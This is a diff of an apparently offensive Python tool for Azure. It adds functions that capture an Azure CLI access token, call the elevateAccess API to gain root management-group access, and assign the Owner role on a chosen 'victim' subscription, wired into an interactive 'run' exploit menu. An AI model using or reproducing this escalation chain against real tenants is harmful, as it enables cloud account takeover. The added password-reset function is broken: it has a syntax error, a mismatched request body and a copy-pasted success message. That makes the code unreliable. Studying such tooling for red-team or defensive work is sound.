@@ -1,9 +1,11 @@
 import requests
 import readline
-import json, sys
-import os
 import base64
+import json, sys
+import uuid
+import os
 from prettytable import PrettyTable
+import subprocess
 
 Token = None
 TotalTargets = []
@@ -54,6 +56,18 @@ d8'          `8b  888888888   `"YbbdP'Y8  88           `"Ybbd8"'  88     `8'    
     print(a)
 
 
+def parseUPN():
+    global Token
+    b64_string = Token.split(".")[1]
+    b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
+    return json.loads(base64.b64decode(b64_string))['upn']
+
+def parseUPNObjectId():
+    global Token
+    b64_string = Token.split(".")[1]
+    b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
+    return json.loads(base64.b64decode(b64_string))['oid']
+
 def setToken(token):
     global Token
     Token = token
@@ -77,26 +91,99 @@ def originitToken(token):
         Token = token
 
 
+'''
+This attack path exploits the Global Administrator to modify privileges to Azure Resources
+Useful when the account has only access to Azure AD, and no access to Azure Subscriptions
+@required_privilege: Global Administrator
+@success: No output from API
+'''
+def GA_ElevateAccess():
+    global Token
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    r = requests.post(
+        "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01",
+        headers=headers)
+    result = r.text
+    if result == "":
+        return "Exploit Success!"
+    else:
+        return "Exploit Failed."
+
+'''
+This API help to abuse Global Administrator with privileges to Azure Resources to assign Owner subscription privileges
+@required_privilege: Global Administrator w/Azure Resources privileges
+@success: Response Context
+'''
+def GA_AssignSubscriptionOwnerRole(subscriptionId):
+    global Token
+    print(parseUPN())
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    r = requests.put(
+        "https://management.azure.com/subscriptions/"+subscriptionId+"/providers/Microsoft.Authorization/roleAssignments/"+str(uuid.uuid4())+"?api-version=2015-07-01",
+        json={
+              "properties": {
+                "roleDefinitionId": "/subscriptions/"+subscriptionId+"/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635",
+                "principalId": str(parseUPNObjectId())
+              }
+            },
+        headers=headers)
+    result = r.json()
+    if result['error']:
+        return "Exploit Failed. Abort."
+    else:
+        return "Exploit Completed! You're Subscription Owner on SubscriptionId=" + str(subscriptionId)
+
+'''
+This API help to privileged account to reset user's Azure AD password
+@required_privilege: Global/Password/Helpdesk/Authentication/User Administrator and Privileged Authentication Administrator
+@success: No output from API
+'''
+def Utility_ResetUserPassword(subscriptionId):
+    global Token
+    print(parseUPN())
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    r = requests.post(
+        "https://graph.microsoft.com/v1.0/users/"+str(parseUPNObjectId())+"/authentication/passwordMethods/28c10230-6103-485e-b985-444c60001490/resetPassword",
+        json={
+              "properties": {
+                "roleDefinitionId": "/subscriptions/"+subscriptionId+"/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635",
+                "principalId":
+              }
+            },
+        headers=headers)
+    result = r.json()
+    if result['error']:
+        return "Exploit Failed. Abort."
+    else:
+        return "Exploit Completed! You're Subscription Owner on SubscriptionId=" + str(subscriptionId)
+
 def tryGetToken():
-    accessToken = None
-    print("Trying with Azure Cli..")
-    output = os.popen('powershell.exe -c "az account get-access-token --resource=https://management.azure.com/"')
-    res = output.read()
-    if 'Exception' in res:
-        print("Trying with Azure Powershell..")
-        output2 = os.popen('powershell.exe -c "(Get-AzAccessToken -ResourceUrl "https://management.azure.com/").Token"')
-        res2 = output2.read()
-        if 'Exception' in res2:
+    try:
+        accessToken = None
+        res = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=\"https://management.azure.com/\""], capture_output=True, text=True)
+        if 'No subscription found' in res.stderr:
+            print("No subscriptions were found. You will need to switch to tenant-level access manually: az login --allow-no-subscriptions")
             print("Failed generate token. You may need to login or try manually.")
-            accessToken = None
+        elif 'Exception' in res.stderr:
+            print("Unable to use azure cli for generating token")
+            print("Failed generate token. You may need to login or try manually.")
         else:
             print("Captured token done. All set!")
-            accessToken = res2
-    else:
-        print("Captured token done. All set!")
-        jres = json.loads(res)
-        accessToken = jres['accessToken']
-    return accessToken
+            jres = json.loads(res.stdout)
+            accessToken = jres['accessToken']
+        return accessToken
+    except:
+        return None
+
 
 
 def canRoleBeAbused(currentRoleName):
@@ -150,6 +237,7 @@ def canPermissionBeAbused(currentPermission):
     StorangeAccountAbuse = ["Microsoft.ClassicStorage/storageAccounts/listKeys/action",
                             "Microsoft.Storage/storageAccounts/listKeys/action"]
     ARMTemplateAbuse = ["Microsoft.Resources/deployments/*"]
+    DirectoryAbuse = ["Microsoft.Resources/deployments/*"]
     ExtensionsAbuse = ["Microsoft.ClassicCompute/virtualMachines/extensions/*",
                        "Microsoft.Compute/virtualMachines/extensions/read",
                        "Microsoft.Compute/virtualMachines/extensions/write"]
@@ -266,11 +354,23 @@ def GetAllResourcesUnderSubscription(subscriptionId, token):
     result = r.json()
     return result
 
+def GetAllResourceGroupsUnderSubscription(subscriptionId):
+    global Token
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    r = requests.get(
+        "https://management.azure.com/subscriptions/" + subscriptionId + "/resources?api-version=2017-05-10",
+        headers=headers)
+    result = r.json()
+    return result
+
 
 displayMenu(True)
 
 def attackWindow():
-    readline.set_completer(SimpleCompleter(['start', 'stop', 'list', 'print']).complete)
+    readline.set_completer(SimpleCompleter(['iam full scan', 'iam roles scan', 'iam permission scan', 'get resources','get sts','get subs','set target <subscriptionId>','sts <subscriptionId>','del target <subscriptionId>','del sts <subscriptionId>','back','exit','show exploits']).complete)
     readline.parse_and_bind('tab: complete')
     while (True):
         global TargetSubscription
@@ -409,18 +509,7 @@ def attackWindow():
             subExploitRecords = PrettyTable()
             subExploitRecords.align = "l"
             subExploitRecords.field_names = ["Name", "Disclosure Date", "Rate", "Description"]
-            subExploitRecords.add_row(["vaults/view_vault_content", "04.07.2022", "Good", "Attack mode"])
-            subExploitRecords.add_row(["groups/get_dynamic_groups", "04.07.2022", "Good", "Attack mode"])
-            subExploitRecords.add_row(["groups/abuse_dynamic_groups", "04.07.2022", "Good", "Attack mode"])
-            subExploitRecords.add_row(["vm/read_user_data", "04.07.2022", "Good", "Attack mode"])
-            subExploitRecords.add_row(["vm/read_custom_extenstions", "04.07.2022", "Good", "Attack mode"])
-            subExploitRecords.add_row(["vm/modify_user_data", "04.07.2022", "Good", "Attack mode"])
-            subExploitRecords.add_row(["identity/get_info", "04.07.2022", "Good", "Attack mode"])
-            subExploitRecords.add_row(["storage/find_vulnerable", "04.07.2022", "Good", "Attack mode"])
-            subExploitRecords.add_row(["automation_account/run_as_account", "04.07.2022", "Good", "Attack mode"])
-            subExploitRecords.add_row(["automation_account/get_runbooks", "04.07.2022", "Good", "Attack mode"])
-            subExploitRecords.add_row(["arm_template/get_strings", "04.07.2022", "Good", "Attack mode"])
-            subExploitRecords.add_row(["functions/get_code", "04.07.2022", "Good", "Attack mode"])
+            subExploitRecords.add_row(["GlobalAdministrator/elevateAccess", "04.07.2022", "Good", "Exploits the Global Administrator role to modify privileges to Azure Resources"])
             print(subExploitRecords)
         elif "use " in mode:
             argExpSub = mode.replace("use ", "").replace(" ", "")
@@ -431,6 +520,27 @@ def attackWindow():
             else:
                 exit
                 statupWindow(True)
+        elif "GlobalAdministrator/elevateAccess" in ExploitChoosen and mode == "run":
+            print("Elevating access to the root management group..")
+            print(GA_ElevateAccess())
+            print("Listing Target Subscriptions..")
+            listSubs = ListSubscriptionsForToken()
+            if listSubs.get('value') == None:
+                print("Exploit Failed: Error occured. Result: " + str(listSubs['error']['message']))
+            else:
+                subRecords = PrettyTable()
+                subRecords.align = "l"
+                subRecords.field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
+                subRecordCount = 0
+                for subRecord in listSubs['value']:
+                    subRecords.add_row(
+                        [subRecordCount, subRecord['subscriptionId'], subRecord['displayName'], subRecord['state'],
+                         subRecord['subscriptionPolicies']['quotaId'],
+                         subRecord['subscriptionPolicies']['spendingLimit']])
+                    subRecordCount += 1
+                print(subRecords)
+                TargetSubscriptionVictim = input("Choose Subscription >> ")
+                print(GA_AssignSubscriptionOwnerRole(str(TargetSubscriptionVictim)))
         else:
             print("unkown command.")
 
